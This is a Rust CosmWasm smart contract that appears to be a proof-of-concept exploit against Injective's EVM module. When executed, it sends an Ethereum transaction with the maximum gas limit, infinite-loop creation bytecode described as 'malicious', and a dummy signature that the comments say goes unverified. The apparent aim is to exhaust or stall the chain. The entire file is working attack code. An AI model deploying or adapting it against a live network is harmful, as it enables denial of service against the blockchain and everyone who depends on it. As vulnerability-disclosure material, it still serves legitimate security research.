use cosmwasm_std::{entry_point, DepsMut, Env, MessageInfo, Response, StdResult, Binary, CosmosMsg, AnyMsg};
use crate::msg::{ExecuteMsg, InstantiateMsg, MsgEthereumTx, LegacyTransaction}; 
use crate::msg::{pb_encode_message, rlp_encode};

#[entry_point]
pub fn instantiate(
    _deps: DepsMut,
    _env: Env,
    _info: MessageInfo,
    _msg: InstantiateMsg,
) -> StdResult<Response> {
    Ok(Response::new())
}

#[entry_point]
pub fn execute(_deps: DepsMut, env: Env, _: MessageInfo, _: ExecuteMsg) -> StdResult<Response> {
    // create legacy tx with u64::MAX as gas limit
    let tx = LegacyTransaction {
         nonce: 0,
         gas_price: 1,
         gas_limit: u64::MAX,
         to: None,
         value: 0,
         // this is the code for "creation" of the malicious evm contract, it consists of 3 opcodes: jumpdest, push0 and jump. Basically and infinite loop limited with gas.
         data: hex::decode("5b5956").unwrap(),
     };

    // rlp encode it with "signature", we don't care about the signature since it doesn't get verified
    let encoded = rlp_encode(&tx, &[1; 32], &[1; 32], 27);
    
    let any_msg = CosmosMsg::Any(AnyMsg {
        type_url:"/injective.evm.v1.MsgEthereumTx".to_string(),
        value: Binary::from(
            // add MsgEthereumTx sub message with encoded legacy tx
            pb_encode_message(&MsgEthereumTx {
                from: _deps
                    .api
                    .addr_canonicalize(env.contract.address.as_str())
                    .unwrap()
                    .to_vec(),
                raw: encoded.to_vec(),
            })
            .unwrap(),
        ),
    });

    Ok(Response::new().add_message(any_msg))
}
